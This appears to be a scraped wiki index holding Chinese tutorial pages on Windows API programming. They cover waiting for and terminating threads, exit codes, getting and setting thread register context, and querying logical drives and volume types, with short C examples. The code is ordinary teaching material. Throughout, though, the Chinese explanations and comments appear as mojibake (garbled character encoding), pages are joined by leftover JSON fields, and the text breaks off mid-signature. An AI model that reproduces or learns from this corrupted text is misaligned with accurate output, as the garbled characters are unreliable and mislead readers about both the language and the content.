ATerminateThread(hThread,3); //ç»“æŸçº¿ç¨‹//... Bï¼ˆä¸ç¡®å®šTreminateThreadæ‰§è¡Œå®Œæ¯•ï¼Œå³çº¿ç¨‹æ˜¯å¦è¢«ç»ˆæ­¢æ˜¯ä¸ç¡®å®šçš„ï¼‰ å¦‚æœBå¤„çš„ä»£ç éœ€è¦åœ¨çº¿ç¨‹å·²ç»å…³é—­çš„å‰æä¸‹æ‰§è¡Œï¼Œä¸Šé¢çš„ä»£ç å°±ä¼šæœ‰é—®é¢˜ã€‚ä¸ºç¡®ä¿çº¿ç¨‹å·²ç»ç»ˆæ­¢ï¼Œç”¨WaitForSingObjectå‡½æ•°ç­‰å¾…çº¿ç¨‹ç»“æŸï¼Œç¡®ä¿çº¿ç¨‹å·²ç»ˆæ­¢ã€‚ 123456//... ATerminateThread(hThread, 3); //ç»“æŸçº¿ç¨‹WaitForSingleObject(hThread, INFINITE);\t//ç¡®ä¿çº¿ç¨‹ç»“æŸ//... B(æ­¤æ—¶çº¿ç¨‹å·²ç¡®å®šç»ˆæ­¢) ç­‰å¾…çº¿ç¨‹ç»“æŸ WaitForSingleObject ç­‰å¾…ä¸€ä¸ªå†…æ ¸å¯¹è±¡æ‰§è¡Œï¼Œç‰¹å®šå¯¹è±¡å¤„äºå·²é€šçŸ¥çŠ¶æ€(in the signaled state)æˆ–ç­‰çš„æ—¶é—´ç­‰å¤Ÿäº†å°±ç»“æŸç­‰å¾…ã€‚ Waits until the specified object is in the signaled state or the time-out interval elapses. 1234DWORD WaitForSingleObject( [in] HANDLE hHandle, // handle to object å¥æŸ„ [in] DWORD dwMilliseconds // time-out interval ç­‰å¾…è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰); [in] hHandleï¼šA handle to the object. For a list of the object types whose handles can be specified, see the following Remarks section. If this handle is closed while the wait is still pending, the functionâ€™s behavior is undefined. The handle must have the SYNCHRONIZE access right. [in] dwMillisecondsï¼šThe time-out interval, in milliseconds. If a nonzero value is specified, the function waits until the object is signaled or the interval elapses. If dwMilliseconds is zero, the function does not enter a wait state if the object is not signaled; it always returns immediately. If dwMilliseconds is INFINITE, the function will return only when the object is signaled.INFINITEï¼šæ— é™ç­‰å¾… WaitForMultipleObjects Waits until one or all of the specified objects are in the signaled state or the time-out interval elapses. 123456DWORD WaitForMultipleObjects( [in] DWORD nCount, // number of handles in array å†…æ ¸å¯¹è±¡çš„æ•°é‡ [in] const HANDLE *lpHandles, // object-handle array å†…æ ¸å¯¹è±¡çš„å¥æŸ„æ•°ç»„ [in] BOOL bWaitAll, // wait option ç­‰å¾…æ¨¡å¼ [in] DWORD dwMilliseconds // time-out interval ç­‰å¾…è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰); [in] nCount:The number of object handles in the array pointed to by lpHandles. [in] lpHandlesï¼šAn array of object handles. [in] bWaitAll TRUEï¼šç­‰å¾…æ‰€æœ‰å¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿå˜æ›´ FALSEï¼šç­‰å¾…ä»»ä¸€å¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿå˜æ›´ In the latter case, the return value indicates the object whose state caused the function to return. [in] dwMillisecondsï¼šThe time-out interval, in milliseconds. GetExitCodeThread Retrieves the termination status of the specified thread. å¼€å‘è€…å¯ä»¥æ ¹æ®ä¸šåŠ¡éœ€è¦ï¼Œç”¨è¿”å›å€¼è¡¨ç¤ºçº¿ç¨‹å‡½æ•°çš„æ‰§è¡Œæƒ…å†µã€‚æ¯”å¦‚ä¸€ä¸ªçº¿ç¨‹å‡½æ•°çš„åŠŸèƒ½æ˜¯ï¼šå†™ä¸€ä¸ªæ–‡ä»¶åˆ°ç£ç›˜ä¸Šï¼ŒæˆåŠŸè¿”å›1ï¼Œå¤±è´¥è¿”å›0ã€‚ 1234567891011DWORD WINAPI ThreadProc(LPVOID lpParameter) &#123; // çº¿ç¨‹æ‰§è¡Œçš„ä»£ç  for (int i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;Thread: %d &quot;, i); &#125; return 0;&#125; ç”¨GetExitCodeThreadå‡½æ•°è·å¾—è¿™ä¸ªè¿”å›å€¼ 1234BOOL GetExitCodeThread( [in] HANDLE hThread, // handle to the thread [out] LPDWORD lpExitCode // termination status); ä¾‹123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#include &lt;stdio.h&gt;DWORD WINAPI ThreadProc(LPVOID lpParameter) &#123; // çº¿ç¨‹æ‰§è¡Œçš„ä»£ç  for (int i = 0; i &lt; 100; i++) &#123; Sleep(50); printf(&quot;Thread: %d &quot;, i); &#125; return 0;&#125;int main(int argc, char* argv[]) &#123; HANDLE hThread; // åˆ›å»ºçº¿ç¨‹ï¼Œä¸æ¥æ”¶è¿”å›å€¼ hThread=CreateThread( NULL, // lpThreadAttributes, çº¿ç¨‹å®‰å…¨å±æ€§ï¼ŒNULLè¡¨ç¤ºé»˜è®¤å®‰å…¨çº§åˆ« 0, // dwStackSize, çº¿ç¨‹å †æ ˆå¤§å°ï¼Œ0è¡¨ç¤ºé»˜è®¤å¤§å° ThreadProc, // lpStartAddress, çº¿ç¨‹å‡½æ•°çš„æŒ‡é’ˆ NULL, // lpParameter, ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°çš„å‚æ•° 0, // dwCreationFlags, çº¿ç¨‹åˆ›å»ºæ ‡å¿—ï¼Œ0è¡¨ç¤ºçº¿ç¨‹ç«‹å³è¿è¡Œ NULL // lpThreadId, è¿”å›çº¿ç¨‹IDçš„æŒ‡é’ˆï¼ŒNULLè¡¨ç¤ºä¸éœ€è¦ ); WaitForSingleObject(hThread, INFINITE); //åœ¨è¿™é‡Œé˜»å¡ //è¦ä¸çº¿ç¨‹å‡½æ•°è¿˜æ²¡æ‰§è¡Œå®Œï¼Œå°±GetExitCodeThreadè·å–ExitCodeï¼Œæ­¤æ—¶è·å–åˆ°çš„ExitCodeæ˜¯ä¹±çš„ DWORD exitCode; GetExitCodeThread(hThread, &amp;exitCode); printf(&quot;Exit Code: %d &quot;, exitCode); // ä¿æŒç­‰å¾…ï¼Œé˜²æ­¢æ§åˆ¶å°é€€å‡º getchar(); return 0;&#125; è®¾ç½®ã€è·å–çº¿ç¨‹ä¸Šä¸‹æ–‡ å¼•è¨€ åœ¨Windowsç³»ç»Ÿä¸­ï¼ŒCPUçš„æ—¶é—´ç‰‡é€šå¸¸ä¸º20msã€‚å½“çº¿ç¨‹Açš„æ—¶é—´ç‰‡è€—å°½åï¼ŒCPUä¼šåˆ‡æ¢åˆ°çº¿ç¨‹Bæ‰§è¡Œã€‚çº¿ç¨‹Bçš„æ—¶é—´ç‰‡è€—å°½åï¼ŒCPUå†åˆ‡å›åˆ°çº¿ç¨‹Aæ‰§è¡Œã€‚ç”¨ODè°ƒè¯•è¿‡ç¨‹åºå°±ä¼šçŸ¥é“ï¼Œæ¯è¡ŒæŒ‡ä»¤çš„æ‰§è¡Œéƒ½ä¼šç”¨åˆ°ä¸€å †å¯„å­˜å™¨ã€‚å½“ä»çº¿ç¨‹Aåˆ‡æ¢åˆ°çº¿ç¨‹Bæ—¶ï¼Œç³»ç»Ÿéœ€è¦ä¿å­˜çº¿ç¨‹Açš„å¯„å­˜å™¨çŠ¶æ€ï¼Œå¹¶åœ¨åˆ‡å›åˆ°çº¿ç¨‹Aæ—¶æ¢å¤è¿™äº›å¯„å­˜å™¨å€¼ã€‚CONTEXT ç»“æ„ç”¨äºä¿å­˜å’Œæ¢å¤è¿™äº›å¯„å­˜å™¨çš„çŠ¶æ€ï¼Œä»¥ç¡®ä¿çº¿ç¨‹çš„æ‰§è¡Œç¯å¢ƒåœ¨ä¸Šä¸‹æ–‡åˆ‡æ¢æ—¶èƒ½å¤Ÿæ­£ç¡®æ¢å¤ã€‚ CONTEXTç»“æ„ å°±æ˜¯å¸¸è¯´çš„çº¿ç¨‹ä¸Šä¸‹æ–‡ 1[in, out] lpContext A pointer to a CONTEXT structure (such as ARM64_NT_CONTEXT) that receives the appropriate context of the specified thread.The value of the ContextFlags member of this structure specifies which portions of a threadâ€™s context are retrieved.The CONTEXT structure is highly processor specific. Refer to the WinNT.h header file for processor-specific definitions of this structures and any alignment requirements.CONTEXTå­—æ®µå’Œå…·ä½“å¤„ç†å™¨é«˜åº¦ç›¸å…³ï¼Œæ‰€ä»¥è¦åœ¨å…·ä½“çš„ç¼–è¯‘ç¯å¢ƒä¸­çš„WinNT.hå¤´æ–‡ä»¶ä¸­å»çœ‹ï¼Œåœ¨å¤´æ–‡ä»¶ä¸­CONTEXTå®šä¹‰çš„æ³¨é‡Šä¸­å¯ä»¥çœ‹åˆ°ContextFlagsæœ‰å“ªäº›å­—æ®µä¾›é€‰æ‹©ã€‚ VC++ä¸‹12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485typedef struct _CONTEXT &#123; // // The flags values within this flag control the contents of // a CONTEXT record. // // If the context record is used as an input parameter, then // for each portion of the context record controlled by a flag // whose value is set, it is assumed that that portion of the // context record contains valid context. If the context record // is being used to modify a threads context, then only that // portion of the threads context will be modified. // // If the context record is used as an IN OUT parameter to capture // the context of a thread, then only those portions of the thread&#x27;s // context corresponding to set flags will be returned. // // The context record is never used as an OUT only parameter. // DWORD ContextFlags; // // This section is specified/returned if CONTEXT_DEBUG_REGISTERS is // set in ContextFlags. Note that CONTEXT_DEBUG_REGISTERS is NOT // included in CONTEXT_FULL. // DWORD Dr0; DWORD Dr1; DWORD Dr2; DWORD Dr3; DWORD Dr6; DWORD Dr7; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_FLOATING_POINT. // FLOATING_SAVE_AREA FloatSave; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_SEGMENTS. // DWORD SegGs; DWORD SegFs; DWORD SegEs; DWORD SegDs; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_INTEGER. // DWORD Edi; DWORD Esi; DWORD Ebx; DWORD Edx; DWORD Ecx; DWORD Eax; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_CONTROL. // DWORD Ebp; DWORD Eip; DWORD SegCs; // MUST BE SANITIZED DWORD EFlags; // MUST BE SANITIZED DWORD Esp; DWORD SegSs; // // This section is specified/returned if the ContextFlags word // contains the flag CONTEXT_EXTENDED_REGISTERS. // The format and contexts are processor specific // BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];&#125; CONTEXT; ç”±äºCONTEXTç»“æ„ä½“æˆå‘˜å¤ªå¤šäº†, å…¶æˆå‘˜ContextFlagsç”¨äºæŒ‡å®šè¦è·å–æˆ–è®¾ç½®å“ªäº›éƒ¨åˆ†çš„ä¸Šä¸‹æ–‡ã€‚å¸¸ç”¨çš„å€¼åŒ…æ‹¬ï¼š CONTEXT_DEBUG_REGISTERS: è·å–æˆ–è®¾ç½®è°ƒè¯•å¯„å­˜å™¨ã€‚ï¼ˆNote that CONTEXT_DEBUG_REGISTERS is NOT included in CONTEXT_FULL.ï¼‰ CONTEXT_FLOATING_POINT: è·å–æˆ–è®¾ç½®æµ®ç‚¹å¯„å­˜å™¨ CONTEXT_SEGMENTS: åŒ…å«æ•°æ®æ®µå¯„å­˜å™¨DSã€æºæ®µå¯„å­˜å™¨SSã€å †æ ˆæ®µå¯„å­˜å™¨SSå’Œé™„åŠ æ®µå¯„å­˜å™¨ESã€FSå’ŒGSã€‚ CONTEXT_INTEGER: è·å–æˆ–è®¾ç½®æ•´æ•°å¯„å­˜å™¨ï¼ˆå¦‚ EAX, EBX, ECX, EDX åœ¨ x86 æ¶æ„ä¸Šï¼‰ CONTEXT_CONTROL: åªè·å–æˆ–è®¾ç½®æ§åˆ¶å¯„å­˜å™¨ï¼ˆå¦‚ EIP, ESP, EBP åœ¨ x86 æ¶æ„ä¸Šï¼‰ã€‚ CONTEXT_FULL: è·å–æˆ–è®¾ç½®æ‰€æœ‰çš„å¯„å­˜å™¨ã€‚ã€ å¯ä»¥ç”¨|è¿›è¡Œç»„åˆï¼Œå¦‚ CONTEXT_INTEGER | CONTEXT_CONTROL å¯ä»¥é€šè¿‡GetThreadContextå’ŒSetThreadContextå‡½æ•°æ¥è·å–å’Œè®¾ç½®çº¿ç¨‹ä¸Šä¸‹æ–‡ã€‚ ä½¿ç”¨GetThreadContextè·å–å‰å¿…é¡»å…ˆæŒ‚èµ·è¿›ç¨‹ï¼Œå¦‚æœæ˜¯æ‰§è¡Œä¸­çš„çº¿ç¨‹ï¼Œè™½ç„¶å¯ä»¥è·å–æˆåŠŸï¼Œä½†è¿™ä¸ªcontextå¹¶ä¸æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºè¿™ä¸ªcontextæ˜¯æ‰§è¡ŒGetThreadContextçš„é‚£ä¸€ç¬é—´å¾—åˆ°çš„ï¼Œè·å–åçº¿ç¨‹è¿˜åœ¨è·‘ï¼Œcontextå¯èƒ½å‘ç”Ÿäº†å˜åŒ–ã€‚ GetThreadContext Retrieves the context of the specified thread. 1234BOOL GetThreadContext( [in] HANDLE hThread, // handle to thread [in, out] LPCONTEXT lpContext // context structure); SetThreadContext Sets the context for the specified thread. 1234BOOL SetThreadContext( [in] HANDLE hThread, // handle to thread [in] const CONTEXT *lpContext // context structure); ä¾‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;windows.h&gt;#include &lt;stdio.h&gt;DWORD WINAPI ThreadProc(LPVOID lpParameter) &#123; // çº¿ç¨‹æ‰§è¡Œçš„ä»£ç  for (int i = 0; i &lt; 100; i++) &#123; Sleep(50); printf(&quot;Thread: %d &quot;, i); &#125; return 0;&#125;int main(int argc, char* argv[]) &#123; HANDLE hThread; // åˆ›å»ºçº¿ç¨‹ï¼Œä¸æ¥æ”¶è¿”å›å€¼ hThread=CreateThread( NULL, // lpThreadAttributes, çº¿ç¨‹å®‰å…¨å±æ€§ï¼ŒNULLè¡¨ç¤ºé»˜è®¤å®‰å…¨çº§åˆ« 0, // dwStackSize, çº¿ç¨‹å †æ ˆå¤§å°ï¼Œ0è¡¨ç¤ºé»˜è®¤å¤§å° ThreadProc, // lpStartAddress, çº¿ç¨‹å‡½æ•°çš„æŒ‡é’ˆ NULL, // lpParameter, ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°çš„å‚æ•° 0, // dwCreationFlags, çº¿ç¨‹åˆ›å»ºæ ‡å¿—ï¼Œ0è¡¨ç¤ºçº¿ç¨‹ç«‹å³è¿è¡Œ NULL // lpThreadId, è¿”å›çº¿ç¨‹IDçš„æŒ‡é’ˆï¼ŒNULLè¡¨ç¤ºä¸éœ€è¦ ); SuspendThread(hThread); CONTEXT c; c.ContextFlags = CONTEXT_INTEGER; //è·å–contextä¸­å“ªäº›éƒ¨åˆ† GetThreadContext(hThread, &amp;c); //è·å–çº¿ç¨‹ä¸Šä¸‹æ–‡ CONTEXT c1; c1.ContextFlags = CONTEXT_INTEGER; c1.Eax = 0x123; SetThreadContext(hThread, &amp;c1); //è®¾ç½®çº¿ç¨‹ä¸Šä¸‹æ–‡ //å†æ¬¡GetThreadContextï¼Œç„¶åæ‰“å°è¾“å‡º return 0;&#125;"},{"title":"æ–‡ä»¶ç³»ç»Ÿ","path":"/wiki/Windows_API/æ–‡ä»¶ç³»ç»Ÿ.html","content":"æ–‡ä»¶ç³»ç»Ÿ ç¡¬ç›˜æ˜¯å­˜å‚¨ä»‹è´¨ï¼Œæ–‡ä»¶ç³»ç»Ÿæ˜¯æ“ä½œç³»ç»Ÿç”¨äºç»„ç»‡å’Œç®¡ç†å­˜å‚¨ä»‹è´¨ä¸Šæ•°æ®çš„æ–¹æ³•å’Œæ•°æ®ç»“æ„ï¼Œç®€å•ç‚¹è¯´å°±æ˜¯åœ¨ç£ç›˜ä¸Šå¦‚ä½•ç»„ç»‡æ–‡ä»¶çš„æ–¹æ³•ã€‚æ–‡ä»¶ç³»ç»Ÿæ˜¯è½¯ä»¶å±‚é¢ä¸Šçš„æ¦‚å¿µã€‚ Windowsä»è¯ç”Ÿåˆ°ç°åœ¨ï¼Œå…¶æ–‡ä»¶ç³»ç»Ÿå·²ç»ç»å†å‡ æ¬¡é‡å¤§çš„å‡çº§ã€‚ä»æœ€å¼€å§‹çš„FAT16åˆ°FAT32æ–‡ä»¶ç³»ç»Ÿåˆ°ç›®å‰åœ¨Windows 2000å’Œ Windows XPä»¥åŠWindows Vistaå‡é‡‡ç”¨çš„NTFSæ–‡ä»¶ç³»ç»Ÿã€‚ NTFSå’ŒFAT32çš„éƒ¨åˆ†åŒºåˆ«å¦‚ä¸‹è¡¨ï¼š NTFS FAT32 ç£ç›˜åˆ†åŒºå®¹é‡ 2T(2048G) 32G å•ä¸ªæ–‡ä»¶å®¹é‡ 4Gä»¥ä¸Š æœ€å¤§4G EFSåŠ å¯† æ”¯æŒ ä¸æ”¯æŒ ç£ç›˜é…é¢ æ”¯æŒ ä¸æ”¯æŒ ç£ç›˜åˆ†åŒºå®¹é‡ NTFSæ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜åˆ†åŒºå®¹é‡èƒ½è¾¾åˆ°2T(2048G)ï¼›FAT32æ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜åˆ†åŒºå®¹é‡èƒ½è¾¾åˆ°32G å•ä¸ªæ–‡ä»¶å®¹é‡ NTFSæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶èƒ½è¾¾åˆ°4Gä»¥ä¸Šï¼Œè€ŒFAT32æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶æœ€å¤§åªèƒ½4Gã€‚ EFSåŠ å¯† ç£ç›˜é…é¢ æŸ¥çœ‹æŸä¸ªç›˜æ‰€ä½¿ç”¨çš„æ–‡ä»¶ç³»ç»Ÿï¼š EFSåŠ å¯†ç£ç›˜é…é¢æ‰“å‹¾åï¼Œæ³¨é”€å½“å‰ç”¨æˆ·ï¼Œåˆ‡æ¢åˆ°åˆ«çš„ç”¨æˆ·ï¼Œåˆ«çš„ç”¨æˆ·è®¿é—®è¯¥æ–‡ä»¶ä¼šæ‹’ç»è®¿é—® é…ç½®æŸä¸ªç”¨æˆ·ä½¿ç”¨è¯¥ç£ç›˜çš„é¢åº¦ï¼Œæ¯”å¦‚é™åˆ¶testç”¨æˆ·ä½¿ç”¨Cç›˜åªèƒ½ä½¿ç”¨1GBçš„é¢åº¦ FAT32ï¼ŒNTFSæ–‡ä»¶ç³»ç»Ÿçš„å®ç°ç»†èŠ‚å¹¶æœªå…¬å¼€ï¼Œä½†æ— è®ºç³»ç»Ÿç”¨çš„æ˜¯å“ªç§æ–‡ä»¶ç³»ç»Ÿï¼Œå¾®è½¯æä¾›çš„APIéƒ½å±è”½äº†è¿™äº›åº•å±‚çš„å®ç°ç»†èŠ‚ï¼Œå¯¹ç”¨æˆ·æ¥è¯´æ˜¯é€æ˜çš„ï¼Œå¼€å‘äººå‘˜æ— è®ºåœ¨å“ªç§æ–‡ä»¶ç³»ç»Ÿï¼Œè°ƒç”¨çš„APIéƒ½æ˜¯åŒä¸€å¥—ã€‚ æ–‡ä»¶ç³»ç»Ÿä¸­æœ€ä¸Šå±‚çš„ç»„ç»‡ç»“æ„æ˜¯å·ï¼Œç„¶åä¸‹ä¸€å±‚æ˜¯ç›®å½•ï¼ˆç›®å½•ä¸­ä¹‹ä¸‹å¯ä»¥è¿˜æ˜¯ç›®å½•ï¼Œæˆ–è€…æ˜¯æ–‡ä»¶ï¼‰ï¼Œæœ€åº•å±‚æ˜¯æ–‡ä»¶ã€‚ ç‰©ç†ç¡¬ç›˜ï¼Œç£ç›˜åˆ†åŒºï¼Œå·ï¼Œå·æ ‡ç­‰æ¦‚å¿µç‰©ç†ç¡¬ç›˜ï¼šç‰©ç†ä¸Šçš„ç¡¬ç›˜è®¾å¤‡ï¼Œæ¯”å¦‚åœ¨ä¸»æœºä¸­è£…äº†ä¸€å—512Gçš„å›ºæ€ç£ç›˜åˆ†åŒº (Disk Partition)ï¼šé€»è¾‘åˆ†åŒºï¼Œæ¯”å¦‚å¯¹ä¸Šé¢512çš„å›ºæ€è¿›è¡Œåˆ†åŒºï¼Œåˆ†æˆ200Gï¼Œ312Gä¸¤ä¸ªåˆ†åŒºæ¥ä½¿ç”¨å· (Volume)ï¼šä¹Ÿç§°é€»è¾‘é©±åŠ¨å™¨ï¼Œæ˜¯æ–‡ä»¶ç³»ç»Ÿç»„ç»‡ç»“æ„çš„æœ€é«˜å±‚ã€‚ä¸€ä¸ªç£ç›˜åˆ†åŒºè‡³å°‘å«æœ‰ä¸€ä¸ªå·ï¼Œå·ä¹Ÿå¯ä»¥å­˜åœ¨äºå¤šä¸ªç£ç›˜åˆ†åŒºä¸Šï¼Œä»…å­˜åœ¨äºä¸€ä¸ªç£ç›˜åˆ†åŒºä¸Šçš„å·ç§°ä¸ºâ€œç®€å•å·â€ï¼Œä»…å­˜åœ¨äºå¤šä¸ªç£ç›˜åˆ†åŒºä¸Šçš„å·ç§°ä¸ºâ€œå¤šåˆ†åŒºå·â€æˆ–â€œè·¨åŒºå·â€ã€‚åœ¨æœ€å¸¸è§çš„æƒ…å†µä¸‹ï¼Œä¸€ä¸ªåˆ†åŒºåªåŒ…å«ä¸€ä¸ªå·,ä¸€ä¸ªå·ä¹Ÿåªå­˜åœ¨äºä¸€ä¸ªåˆ†åŒºä¸Šï¼Œæ‰€ä»¥ä¸¤è€…å®¹æ˜“æ··æ·†ã€‚å·å­˜åœ¨å·æ ‡ï¼Œç¨‹åºå¯ä»¥é€šè¿‡å·æ ‡è®¿é—®å·ã€‚å·æ ‡ (Volume Label)ï¼šå·çš„åç§°ã€‚é»˜è®¤æƒ…å†µé‡å‘½åäº†ç£ç›˜ æœ¬å°èŠ‚è¦è®²çš„å°±æ˜¯æ–‡ä»¶ç³»ç»Ÿä¸­ç»„ç»‡ç»“æ„å±‚çº§ï¼šå·ï¼Œç›®å½•ï¼Œæ–‡ä»¶ç›¸å…³çš„APIã€‚ å·ç›¸å…³API è·å–å·GetLogicalDrives() è·å–ä¸»æœºä¸­æ‰€æœ‰çš„å·ï¼ˆé€»è¾‘é©±åŠ¨å™¨ï¼‰ï¼Œä»¥BitMapå½¢å¼è¿”å› 1DWORD GetLogicalDrives(); è¿”å›å€¼DWORDç±»å‹ï¼Œåœ¨è¿™ä¸ªDWORDä¸­ï¼Œå…¶ä¸­æ¯ä¸ªæ¯”ç‰¹ï¼ˆbitï¼‰è¡¨ç¤ºä¸€ä¸ªé©±åŠ¨å™¨ï¼šç¬¬0ä½ä»£è¡¨Aç›˜ï¼Œç¬¬1ä½ä»£è¡¨Bç›˜ï¼Œä»¥æ­¤ç±»æ¨ã€‚å¦‚æœæŸä½æ˜¯1ï¼Œåˆ™è¡¨ç¤ºç›¸åº”çš„é©±åŠ¨å™¨å­˜åœ¨ï¼›å¦‚æœæ˜¯0ï¼Œåˆ™è¡¨ç¤ºä¸å­˜åœ¨ã€‚ ç¤ºä¾‹12345678910#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; DWORD dwLogicalDrives = GetLogicalDrives(); printf(&quot;%x &quot;, dwLogicalDrives); return 0;&#125;è¾“å‡º12cå°†cæ‹†å¼€ï¼Œ1100ï¼Œç¬¬2ä½ä¸º1ï¼Œè¡¨ç¤ºå­˜åœ¨Cç›˜é©±åŠ¨å™¨ï¼Œç¬¬3ä½ä¸º1ï¼Œè¡¨ç¤ºå­˜åœ¨Dç›˜é©±åŠ¨å™¨ï¼Œ è·å–ä¸€ä¸ªå·çš„å­—ç¬¦ä¸²GetLogicalDriveStrings() è·å–ä¸»æœºä¸­æ‰€æœ‰çš„å·ï¼ˆé€»è¾‘é©±åŠ¨å™¨ï¼‰ï¼Œä»¥é©±åŠ¨å™¨æ ¹è·¯å¾„å½¢å¼å­—ç¬¦ä¸²è¿”å› 1234DWORD GetLogicalDriveStringsW( [in] DWORD nBufferLength, //æŒ‡å®šlpBufferç¼“å†²åŒºçš„size [out] LPWSTR lpBuffer //outå‚æ•°ï¼Œæ¥æ”¶ç»“æœçš„ç¼“å†²åŒº); è¿”å›å€¼ï¼š æˆåŠŸ ç¼“å†²åŒºä¸­å°±æ˜¯è¿”å›ç»“æœçš„æ€»é•¿åº¦ è¿”å›å€¼å¤§äºnBufferLengthï¼Œè¯´æ˜ç¼“å†²åŒºé•¿åº¦ä¸å¤Ÿï¼Œè£…ä¸ä¸‹ï¼Œé‚£ä¹ˆæŒ‰nBufferLengthçš„é•¿åº¦è¿”å› å¤±è´¥ è¿”å›å€¼ä¸º0 ç¤ºä¾‹1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; DWORD dwMaxLength = 100; char szBuffer[100]; GetLogicalDriveStrings(dwMaxLength, szBuffer); // é¦–å…ˆæ‰“å°æ‰€æœ‰å­—ç¬¦çš„åå…­è¿›åˆ¶å½¢å¼ printf(&quot;Hex: &quot;); for(int i = 0; szBuffer[i] != &#x27;\\0&#x27; || szBuffer[i-1] != &#x27;\\0&#x27;; i++) &#123; printf(&quot;%02X &quot;, (unsigned char)szBuffer[i]); &#125; printf(&quot; &quot;); // ç„¶åæ‰“å°æ‰€æœ‰å­—ç¬¦çš„ASCIIå½¢å¼ printf(&quot;ASCII: &quot;); for(int j = 0; szBuffer[j] != &#x27;\\0&#x27; || szBuffer[j-1] != &#x27;\\0&#x27;; j++) &#123; char c = szBuffer[j]; if (c &gt;= 32 &amp;&amp; c &lt;= 126) &#123; // å¯æ‰“å°å­—ç¬¦ printf(&quot;%-3c&quot;, c); &#125; else &#123; // ä¸å¯æ‰“å°å­—ç¬¦ï¼ˆå¦‚ç©ºå­—ç¬¦ï¼‰ç”¨ç‚¹ï¼ˆ.ï¼‰è¡¨ç¤º printf(&quot;%-3c&quot;, &#x27;.&#x27;); &#125; &#125; printf(&quot; &quot;); // éå†szBufferä»¥æ‰“å°æ‰€æœ‰é©±åŠ¨å™¨åç§° for(char *pDrive = szBuffer; *pDrive != &#x27;\\0&#x27;; pDrive += strlen(pDrive) + 1) &#123; printf(&quot;%s &quot;, pDrive); &#125; return 0;&#125;ç»§ç»­éå†szBufferå­—ç¬¦æ•°ç»„çš„æƒ…å†µï¼šå½“å‰å­—ç¬¦ä¸ä¸ºç©º æˆ– ä¸Šä¸€ä¸ªå­—ç¬¦ä¸ä¸ºç©ºå½“è¿ç»­ä¸¤ä¸ªå­—ç¬¦éƒ½ä¸ºç©ºï¼Œå°±æ˜¯åˆ°ç»“å°¾äº† è·å–å·çš„ç±»å‹GetDriveType() è·å–é©±åŠ¨å™¨ç±»å‹ 123UINT GetDriveTypeA([in, optional] LPCSTR lpRootPathName // é©±åŠ¨å™¨æ ¹è·¯å¾„ï¼Œå¦‚&quot;C:\\&quot;); The return value specifies the type of drive, which can be one of the following values. Return code/value Description DRIVE_UNKNOWN0 The drive type cannot be determined. DRIVE_NO_ROOT_DIR1 The root path is invalid; for example, there is no volume mounted at the specified path. DRIVE_REMOVABLE2 The drive has removable media; for example, a floppy drive, thumb drive, or flash card reader. DRIVE_FIXED3 The drive has fixed media; for example, a hard disk drive or flash drive. DRIVE_REMOTE4 The drive is a remote (network) drive. DRIVE_CDROM5 The drive is a CD-ROM drive. DRIVE_RAMDISK6 The drive is a RAM disk. ç¤ºä¾‹12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; // æ£€ç´¢ç³»ç»Ÿä¸­æ‰€æœ‰é€»è¾‘é©±åŠ¨å™¨çš„å­—ç¬¦ä¸² DWORD dwSize = 100; char szDriveStrings[100]; GetLogicalDriveStrings(dwSize, szDriveStrings); // éå†æ¯ä¸ªé©±åŠ¨å™¨ for (char* pDrive = szDriveStrings; *pDrive != &#x27;\\0&#x27;; pDrive += strlen(pDrive) + 1) &#123; printf(&quot;Drive %s - &quot;, pDrive); // è·å–é©±åŠ¨å™¨ç±»å‹ UINT driveType = GetDriveType(pDrive); // åŒ¹é…ä¸åŒçš„é©±åŠ¨å™¨ç±»å‹ switch (driveType) &#123; case DRIVE_UNKNOWN: // é©±åŠ¨å™¨ç±»å‹æœªçŸ¥ printf(&quot;Type Unknown &quot;); break; case DRIVE_NO_ROOT_DIR: // é©±åŠ¨å™¨æ²¡æœ‰æ ¹ç›®å½• printf(&quot;No Root Directory &quot;); break; case DRIVE_REMOVABLE: // å¯ç§»åŠ¨é©±åŠ¨å™¨ï¼ˆä¾‹å¦‚USBé—ªå­˜é©±åŠ¨å™¨æˆ–è½¯ç›˜ï¼‰ printf(&quot;Removable Drive &quot;); break; case DRIVE_FIXED: // å›ºå®šé©±åŠ¨å™¨ï¼ˆä¾‹å¦‚ç¡¬ç›˜ï¼‰ printf(&quot;Fixed Drive &quot;); break; case DRIVE_REMOTE: // ç½‘ç»œé©±åŠ¨å™¨ printf(&quot;Network Drive &quot;); break; case DRIVE_CDROM: // CD-ROMé©±åŠ¨å™¨ printf(&quot;CD-ROM Drive &quot;); break; case DRIVE_RAMDISK: // RAMç›˜ printf(&quot;RAM Disk &quot;); break; default: // æœªè¯†åˆ«çš„ç±»å‹ printf(&quot;Type Not Recognized &quot;); break; &#125; &#125; return 0;&#125; è·å–å·çš„è¯¦ç»†ä¿¡æ¯GetVolumeInformation() è·å–å·ï¼ˆé€»è¾‘é©±åŠ¨å™¨ï¼‰çš„è¯¦ç»†ä¿¡æ¯ 12345678910BOOL GetVolumeInformationA( [in, optional] LPCSTR lpRootPathName, //æ‰€è¦è·å–å±æ€§çš„é©±åŠ¨å™¨çš„æ 